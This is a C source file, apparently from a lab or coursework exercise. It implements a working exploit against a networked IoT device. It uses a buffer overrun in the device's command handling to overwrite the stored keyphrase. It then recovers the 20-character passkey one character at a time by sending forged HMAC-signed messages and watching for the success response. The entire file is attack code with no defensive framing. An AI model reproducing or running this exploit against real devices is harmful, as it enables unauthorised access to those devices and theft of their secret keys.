#include "crack.h"

// Parts of the messages
const char* flag = "ClientCmd";
const char* user_nmb = userNMB; // from serverData.h
const char delimeter = '|';


// Query info
int keyLEN = 20;
char init_key[21] = "aaaaaaaaaaaaaaaaaaaa";
int comLEN = 60; // Initial command's length that overwrites the entire keyphrase
const char com = 'a'; // Used for overwrite the keyphrase using the device buffer overrun vulnerability
int flagLEN = strlen((char*)flag);
int userLEN = strlen((char*)user_nmb);


// The passkey of the IoT device
char passkey[21] = "--------------------";
// Found key's characters
int passkey_correct = 0;

int comLEN_FIT = comLEN; // the amount of characters before reaching the passkey

// IoT device responses
const char* hmac_error = "Invalid HMAC.";
const char* hmac_success = "Authentication successful.";


// Find the command length required to overwrite only the keyphrase and nothing else after it. 
// @param server_ip the IP of the device
// @param port the port of the device
// @return if something fails return 1, otherwise 0
int find_comLEN(const char* server_ip, int port) {

    // The device response
    char status[81] = "";

    // Stop the loop when the HMAC is invalid => the command does not overwrite the entire key
    while (strstr(status, hmac_error) == NULL) {
        
        // Create TCP socket
        int sock = socket(AF_INET, SOCK_STREAM, 0);  // AF_INTER - between processes on different hosts; SOCK_STREAM - TCP
        if (sock < 0) {
            fprintf(stderr, "find_comLEN #1\n");
            return 1;
        }

        // Configure server address
        struct sockaddr_in server; // Used to describe an IPv4 network address to socket API

        memset(&server, 0, sizeof(server)); // Fill server with only zeros
        server.sin_family = AF_INET;
        server.sin_port = htons(port); // Host to Network Short  (from host byte order to network byte order) / from little-endian to big-endian

        if (inet_pton(AF_INET, server_ip, &server.sin_addr) <= 0) {
            fprintf(stderr, "find_comLEN #2\n");
            close(sock);
            return 1;
        }

        // Establish TCP connection
        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            fprintf(stderr, "connect error");
            close(sock);
            return 1;
        }

        // Create the message
        char msg[userLEN + 1 + comLEN + 1 + 64 + 1 + 1];

        // Compute the length of the command
        comLEN_FIT = comLEN - keyLEN;

        int msg_res = computeMSG(msg, init_key, 20);

        if (msg_res){
            fprintf(stderr, "find_comLEN #3");
            close(sock);
            return 1;
        }

        printf("command length: %d\n", comLEN); 

        // Send data
        if (send(sock, msg, strlen(msg), 0) < 0) {
            fprintf(stderr, "find_comLEN #4\n");
            close(sock);
            return 1;
        }

        // Recieve response
        char buffer[81];

        ssize_t n = recv(sock, buffer, sizeof(buffer) - 1, 0);

        if (n < 0) {
            fprintf(stderr, "find_comLEN #5\n");
            close(sock);
            return 1;
        }
        else if (n == 0) {
            printf("Server closed connection\n");
            close(sock);
            return 1;
        }
        else {
            buffer[n] = '\0';
            printf("Received: %s\n", buffer);
        }

        // Close TCP connection
        close(sock);

        // Copy response to status buffer
        strcpy(status, buffer);

        // Decrement the length of the command
        comLEN -= 1;
        comLEN_FIT -= 1;

    }

    // Last input is not accepted, so add the last removed a
    comLEN += 2; // 51
    // Compute the characters required to fill the memory before reaching the keyphrase
    comLEN_FIT = comLEN - keyLEN;

    printf("LEN FOR COMMAND: %d\n", comLEN);
    printf("LEN FOR COMMAND FIT: %d\n", comLEN_FIT);

    return 0;
}



// Create the message that will be send to the IoT device
// @param msg a pointer to the message string 
// @param key a string used to authenticate the message
// @param ind the index of the key character that the program is trying to find (0 - 19)
// @return if something fails return 1, otherwise 0
int computeMSG(char* msg, char* key, int ind) {
    
    // user;command;HMAC
    memcpy(msg, user_nmb, userLEN); // user
    memset(msg + userLEN, ';', 1);  // ;

    // Check which char is being found
    if (ind > 0){
        memset(msg + userLEN + 1, com, comLEN_FIT);                     // 'aaa...'
        memcpy(msg + userLEN + 1 + comLEN_FIT, key, strlen(key));       // part of the key used
        memset(msg + userLEN + 1 + comLEN_FIT + strlen(key), ';', 1);   // ;

        // Create the HMAC
        char hmac_hex[65];
        int res = computeHMAC(hmac_hex, key, ind);
        if (res) {
            fprintf(stderr, "computeMSG #1\n");
            return 1;
        }

        memcpy(msg + userLEN + 1 + comLEN_FIT + strlen(key) + 1, hmac_hex, 64); // HMAC
        msg[userLEN + 1 + comLEN_FIT + strlen(key) + 1 + 64] = '\r';            // \r
        msg[userLEN + 1 + comLEN_FIT + strlen(key) + 1 + 64 + 1] = '\0';        // \0

        printf("MSG TO SEND: %s\n", msg);
    }
    else if (ind == 0){
        memset(msg + userLEN + 1, com, comLEN_FIT - 1);     // 'aaa...'
        memset(msg + userLEN + 1 + comLEN_FIT - 1, ';', 1); // ;

        // Create the HMAC
        char hmac_hex[65];
        int res = computeHMAC(hmac_hex, key, ind);
        if (res) {
            fprintf(stderr, "computeMSG #2\n");
            return 1;
        }

        memcpy(msg + userLEN + 1 + comLEN_FIT - 1 + 1, hmac_hex, 64);  // HMAC
        msg[userLEN + 1 + comLEN_FIT - 1 + 1 + 64] = '\r';             // \r
        msg[userLEN + 1 + comLEN_FIT - 1 + 1 + 64 + 1] = '\0';         // \0

        printf("MSG TO SEND: %s\n", msg);

    }
    else {
        fprintf(stderr, "computeMSG #3\n");
        return 1;
    }
    
    return 0;
}


// Generate the HMAC to authenticate the messages sent to the IoT device
// @param hmac_hex a pointer to the HMAC 
// @param key a string used to authenticate the message
// @param ind the index of the key character that the program is trying to find (0 - 19)
// @return if something fails return 1, otherwise 0
int computeHMAC(char* hmac_hex, char* key, int ind) {
    
    if (ind > 0){
        // Combining the parts
        unsigned char res[flagLEN + 1 + userLEN + 1 + comLEN_FIT + strlen(key) + 1];

        // flagLEN|user|key
        memcpy(res, flag, flagLEN);                             
        memset(res + flagLEN, delimeter, 1);
        memcpy(res + flagLEN + 1, user_nmb, userLEN);
        memset(res + flagLEN + 1 + userLEN, delimeter, 1);
        memset(res + flagLEN + 1 + userLEN + 1, com, comLEN_FIT);
        memcpy(res + flagLEN + 1 + userLEN + 1 + comLEN_FIT, key, strlen(key));
    
        res[flagLEN + 1 + userLEN + 1 + comLEN_FIT + strlen(key)] = '\0';

        printf("HMAC INPUT: %s\n", res);

        // Generating the HMAC
        unsigned char* hmac = HMAC(EVP_sha256(), key, keyLEN, res, (int)strlen((char*)res), NULL, NULL);

        // Error handling
        if (!hmac) {
            fprintf(stderr, "computeHMAC #1\n");
            return 1;
        }

        // Transforming to hex
        for (int i = 0; i < 32; i++) {
            sprintf(hmac_hex + i * 2, "%02x", hmac[i]);
        }

        return 0; 
    }
    else if (ind == 0){

        // Combining the parts
        unsigned char res[flagLEN + 1 + userLEN + 1 + comLEN_FIT - 1 + 1];

        memcpy(res, flag, flagLEN);
        memset(res + flagLEN, delimeter, 1);
        memcpy(res + flagLEN + 1, user_nmb, userLEN);
        memset(res + flagLEN + 1 + userLEN, delimeter, 1);
        memset(res + flagLEN + 1 + userLEN + 1, com, comLEN_FIT - 1);
    
        res[flagLEN + 1 + userLEN + 1 + comLEN_FIT - 1] = '\0';

        printf("HMAC INPUT: %s\n", res);

        // Generate the HMAC
        unsigned char* hmac = HMAC(EVP_sha256(), key, keyLEN, res, (int)strlen((char*)res), NULL, NULL);

        // Error handling
        if (!hmac) {
            fprintf(stderr, "computeHMAC #2\n");
            return 1;
        }

        // Transforming to hex
        for (int i = 0; i < 32; i++) {
            sprintf(hmac_hex + i * 2, "%02x", hmac[i]);
        }

        return 0; 
    }
    else {
        fprintf(stderr, "computeHMAC #3\n");
        return 1;
    }
}

// Compute the message and the key to authenticate the message
// @param msg a pointer to the message
// @param ind the index of the key character that the program is trying to find (0 - 19)
// @param ch a character from the ASCII list used to crack the key
// @return if something fails return 1, otherwise 0
int compute_msg_and_key(char* msg, int ind, char ch) {

    // Create the key
    char key[keyLEN + 1]; // +1 for the null terminator   

    int key_res = generate_key(ind, ch, key);

    if (key_res){
        fprintf(stderr, "compute_msg_and_key #1\n");
        return 1;
    }

    // Create the msg
    int msg_res = computeMSG(msg, key, ind);
    if (msg_res){
        fprintf(stderr, "compute_msg_and_key #2\n");
        return 1;
    }
 
    return 0;
}

// Crack a passkey's character of the given IoT device
// @param server_ip the IP of the device
// @param port the port of the device
// @param ind the index of the key character that the program is trying to find (0 - 19)
// @param ch a character from the ASCII list used to crack the key
// @return if something fails return 1, otherwise 0
int crack(const char* server_ip, int port, int ind, char ch) {
       
    // Create TCP socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);  // AF_INTER - between processes on different hosts; SOCK_STREAM - TCP
    if (sock < 0) {
        fprintf(stderr, "crack #1\n");
        return 1;
    }

    // Configure server address
    struct sockaddr_in server; // Used to describe an IPv4 network address to socket API

    memset(&server, 0, sizeof(server)); // Fill server with only zeros
    server.sin_family = AF_INET;
    server.sin_port = htons(port); // Host to Network Short  (from host byte order to network byte order) / from little-endian to big-endian

    if (inet_pton(AF_INET, server_ip, &server.sin_addr) <= 0) {
        fprintf(stderr, "crack #2\n");
        close(sock);
        return 1;
    }

    // Establish TCP connection
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        fprintf(stderr, "crack #3\n");
        close(sock);
        return 1;
    }

    // Calculate the length of the key
    int current_keyLEN = ind - 1;
    // Compute the lengthof the entire command sent to the IoT device
    int current_comLEN = comLEN_FIT + current_keyLEN; // aaa...aaa\0X - the null terminator not in com (automatically comes on server side)

    // Size of the message
    int size;

    if (ind > 0){
        size = userLEN + 1 + comLEN_FIT + ind - 1 + 1 + 64 + 1 + 1;
    }
    else if (ind == 0) {
        size = userLEN + 1 + comLEN_FIT - 1 + 1 + 64 + 1 + 1;
    }
    else {
        fprintf(stderr, "crack #4");
        close(sock);
        return 1;
    }
    // Create the message
    char msg[size];
    int compute_res = compute_msg_and_key(msg, ind, ch);

    if (compute_res){
        fprintf(stderr, "crack #5\n");
        close(sock);
        return 1;
    }

    // Send the message to the device
    if (send(sock, msg, 6 + 1 + comLEN + 1 + 64 + 1, 0) < 0) {
        fprintf(stderr, "crack #5\n");
        close(sock);
        return 1;
    }

    // Recieve the response
    char buffer[81]; // the maximum response is set to 80 chars on the server

    ssize_t n = recv(sock, buffer, sizeof(buffer) - 1, 0);

    if (n < 0) {
        fprintf(stderr, "crack #6\n");
        close(sock);
        return 1;
    }
    else if (n == 0) {
        printf("Server closed connection\n");
        close(sock);
        return 1;
    }
    else {
        buffer[n] = '\0';
        printf("Received: %s\n", buffer);
    }


    if (strstr(buffer, hmac_success) != NULL) {
        passkey[ind] = ch;
        add_correct();
    }
    else if (strstr(buffer, hmac_error) != NULL)
    {
         // do nothing  
    }
    else{
        fprintf(stderr, "crack #7\n");
        close(sock);
        return 1;
    }

    
    // Close the TCP connection
    close(sock);            
        
    printf("PASSKEY: %s\n", passkey);
    return 0;
}


// Generate a key to authenticate the messages
// @param ind the index of the key character that the program is trying to find (0 - 19)
// @param ch a character from the ASCII list used to crack the key
// @param key a pointer for the key
// @return if something fails return 1, otherwise 0
int generate_key(int ind, char ch, char* key){

    // ind - 0 - 19
    if (ind > 19 || ind < 0){
        fprintf(stderr, "generate_key #1\n");
        return 1;
    }

    if (ind == 0) {
        key[ind] = ch;

        // Check whether the passkey is updated before cracking the next character
        if (passkey_correct != (keyLEN - (ind + 1))) {
            fprintf(stderr, "generate_key #2\n");
            return 1;
        }

        // Copy the found characters to the key
        for (int i = 0; i < passkey_correct; i++) {
            key[ind + 1 + i] = passkey[ind + 1 + i];
        }
        key[keyLEN] = '\0';
    }
    else{

        memset(key, 'a', ind - 1);
        memset(key + ind - 1, '\0', 1);
        key[ind] = ch;

        if (passkey_correct != (keyLEN - (ind + 1))) {
            fprintf(stderr, "generate_key #3\n");
            return 1;
        }


        for (int i = 0; i < passkey_correct; i++) {
            key[ind + 1 + i] = passkey[ind + 1 + i];
        }
        key[keyLEN] = '\0';
    }

    printf("KEY: ");
    for (int i = 0; i < keyLEN; i++) {
        if (key[i] == '\0')
            printf("\\0");
        else
            printf("%c", key[i]);
    }
    printf("\n");

    return 0;
}

// Increase the found characters by one
void add_correct(){
    passkey_correct+=1;
}

// Retrieve the found characters
int get_correct(){
    return passkey_correct;
}